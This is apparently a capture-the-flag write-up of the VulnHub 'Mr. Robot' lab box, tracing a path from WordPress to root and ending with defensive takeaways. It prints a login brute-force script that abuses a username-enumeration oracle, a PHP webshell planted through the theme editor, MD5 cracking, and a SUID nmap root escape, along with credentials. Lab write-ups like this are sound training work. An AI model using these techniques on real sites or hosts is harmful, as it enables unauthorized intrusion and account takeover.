Mr. Robot is an Easy **VulnHub** box (from my self-hosted eJPTv2 lab) themed on the TV show, and it's a tidy WordPress-to-root journey in three keys. A **WordPress** site leaks a username-enumeration oracle on its login form, so a two-phase brute-force against the box's own `fsocity.dic` wordlist recovers **`elliot:ER28-0652`**. From the admin panel the theme editor turns a `404.php` template into a webshell (`daemon` RCE); a cracked MD5 in `robot`'s home gives lateral movement to `robot`; and a **SUID `nmap`** with its ancient interactive mode drops straight to `root`. Three flags along the way.

## Reconnaissance & Enumeration

### Port Scan

```bash
sudo arp-scan -I vboxnet1 --localnet      # → 192.168.57.7
sudo nmap -p- -sCV 192.168.57.7 -oN nmap
```

```bash
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

SSH is closed, so the only surface is the web server on 80/443. The site renders a Mr. Robot-themed intro with no title — time to enumerate content.

### Web & WordPress Enumeration

`gobuster` makes the stack obvious — this is **WordPress** (`wp-login`, `wp-admin`, `wp-content`, …), and it flags a couple of non-standard paths:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://192.168.57.7/
# ... wp-login, wp-admin, wp-content ...
# robots   (Status: 200)
# license  (Status: 200)
```

`robots.txt` is the first key — it names a flag file and a wordlist:

```bash
curl http://192.168.57.7/robots
# User-agent: *
# fsocity.dic
# key-1-of-3.txt
```

```bash
curl http://192.168.57.7/key-1-of-3.txt      # REDACTED  (flag 1)
wget http://192.168.57.7/fsocity.dic         # a 7 MB wordlist
```

**`fsocity.dic`** is a ~7 MB dictionary the box hands us deliberately — it's the wordlist for the login attack. (It's full of duplicates, so `sort -u fsocity.dic` makes the brute-force far faster.)

## Initial Access — WordPress Theme Editor Webshell as `daemon`

### Brute-forcing the login with a username oracle

WordPress's `wp-login.php` is an **enumeration oracle**: for a username that doesn't exist it replies *"Invalid username"*, but for a real one with a wrong password it replies *"The password you entered for the username X is incorrect."* That difference lets a brute-force run in two phases — first find a valid username, then crack its password — which is exactly what my Python script does:

```python
# Phase 1 — find the user: stop when the reply is NOT "Invalid username"
data = {"log": user, "pwd": "x", "wp-submit": "Log In"}
if "Invalid username" not in requests.post(url, data=data).text:
    # valid username found

# Phase 2 — crack the password with fsocity.dic: stop when the
# "password ... is incorrect" message disappears
data = {"log": username, "pwd": password, "wp-submit": "Log In"}
if "The password you entered for the username" not in requests.post(url, data=data).text:
    # password found
```

```bash
python3 userEnum.py
# [+] Username: elliot
# [+] Password: elliot:ER28-0652
```

**`elliot:ER28-0652`** logs straight into `wp-admin`.

### Theme editor → webshell → RCE

WordPress admins can edit theme PHP in-browser (**Appearance → Editor**). I overwrite an unused template — the Twenty Fifteen theme's `404.php` — with a one-line webshell and hit *Update File*:

```php
<?php system($_GET['cmd']); ?>
```

Requesting that template with a `cmd` parameter runs commands as the web user:

```bash
curl 'http://192.168.57.7/wp-content/themes/twentyfifteen/404.php?cmd=id'
# uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Code execution as **`daemon`**. After a reverse shell and the usual TTY upgrade, on to the next user.

## Lateral Movement — `daemon` → `robot`

`robot`'s home directory holds the second key and a password file. The key itself is readable only by `robot`, but the password hash is world-readable:

```bash
daemon@linux:/home/robot$ ls -la
# -r-------- robot robot  key-2-of-3.txt      (can't read as daemon)
# -rw-r--r-- robot robot  password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

The filename says it all — a **raw MD5**. hashcat mode 0 cracks it instantly against rockyou:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

`su robot` with that password, and the second key is readable:

```bash
daemon@linux:/$ su robot        # password: abcdefghijklmnopqrstuvwxyz
robot@linux:~$ cat key-2-of-3.txt     # REDACTED  (flag 2)
```

## Privilege Escalation — `robot` → `root` (SUID `nmap`)

The SUID hunt returns a telling binary — `nmap` in a non-standard location:

```bash
robot@linux:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/nmap
```

This is an **ancient nmap (v3.81)** that still has the legacy **`--interactive`** mode, and with the SUID bit it runs as root. Interactive mode can shell out with `!`, so it's a direct [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) root shell:

```bash
robot@linux:~$ nmap --interactive
nmap> !/bin/bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/key-3-of-3.txt     # REDACTED  (flag 3)
```

Root, and the final key.

## Key Takeaways

- **WordPress tells you which usernames exist.** The login form's distinct replies for a bad username vs a bad password are a free enumeration oracle — find the real account first (`elliot`), then you only brute-force one user's password. Generic *"invalid credentials"* messaging would have closed this door.
- **The box's own wordlist is the hint.** `fsocity.dic` was served on purpose; recognising a supplied dictionary as the intended attack path (and de-duplicating it) is half the battle on a CTF login.
- **The theme editor is RCE for a WordPress admin.** Editing a theme's PHP in `Appearance → Editor` is a built-in feature that writes executable code to the webroot — any admin login is effectively a shell. Disable file editing (`DISALLOW_FILE_EDIT`) on real sites.
- **World-readable secrets undo file permissions.** `key-2` was locked to `robot`, but `password.raw-md5` next to it wasn't — and a weak MD5 of `abcdefghijklmnopqrstuvwxyz` handed over the account anyway. A protected file is worthless beside a crackable password for the same user.
- **SUID on `nmap` is an instant root shell.** The old interactive mode (`!command`) running as root via the SUID bit is textbook GTFOBins. Audit SUID binaries (`find / -perm -4000`) — anything that can spawn a shell or run commands should never carry the bit.
